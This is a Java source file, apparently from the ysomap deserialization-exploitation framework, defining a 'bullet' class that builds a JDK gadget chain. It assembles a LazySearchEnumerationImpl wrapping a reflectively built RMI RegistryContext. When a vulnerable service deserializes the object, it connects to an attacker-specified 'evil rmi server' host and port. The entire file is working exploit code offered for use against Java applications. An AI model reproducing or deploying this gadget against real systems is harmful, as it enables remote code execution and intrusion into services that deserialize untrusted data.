package ysomap.core.bullet.jdk;

import com.sun.jndi.rmi.registry.RegistryContext;
import com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl;
import sun.rmi.registry.RegistryImpl_Stub;
import sun.rmi.server.UnicastRef;
import ysomap.common.annotation.Bullets;
import ysomap.common.annotation.NotNull;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.bullet.jdk.rmi.RMIConnectBullet;
import ysomap.core.util.ReflectionHelper;

/**
 * @author wh1t3P1g
 * @since 2021/6/1
 */
@Bullets
public class LazySearchEnumerationImplBullet extends Bullet<LazySearchEnumerationImpl> {

    @NotNull
    @Require(name = "rhost", detail = "Remote RMI Server Host to Connect, plz running a evil rmi server")
    public String rhost;

    @NotNull
    @Require(name = "rport", type = "int", detail = "Remote RMI Server Port, Default 1099")
    public String rport = "1099";

    @Override
    public LazySearchEnumerationImpl getObject() throws Exception {
        RegistryContext ctx = ReflectionHelper.createWithoutConstructor(RegistryContext.class);
        Bullet bullet = new RMIConnectBullet();
        bullet.set("rhost", rhost);
        bullet.set("rport", rport);
        RegistryImpl_Stub stub = new RegistryImpl_Stub((UnicastRef)bullet.getObject());
        ReflectionHelper.setFieldValue(ctx, "host", rhost);
        ReflectionHelper.setFieldValue(ctx, "port", Integer.parseInt(rport));
        ReflectionHelper.setFieldValue(ctx, "registry", stub);
        Object naming = ReflectionHelper
                .createWithoutConstructor("com.sun.jndi.rmi.registry.BindingEnumeration");
        ReflectionHelper.setFieldValue(naming, "ctx", ctx);
        LazySearchEnumerationImpl enumeration = ReflectionHelper.createWithoutConstructor(LazySearchEnumerationImpl.class);
        ReflectionHelper.setFieldValue(enumeration, "candidates", naming);
        return enumeration;
    }
}
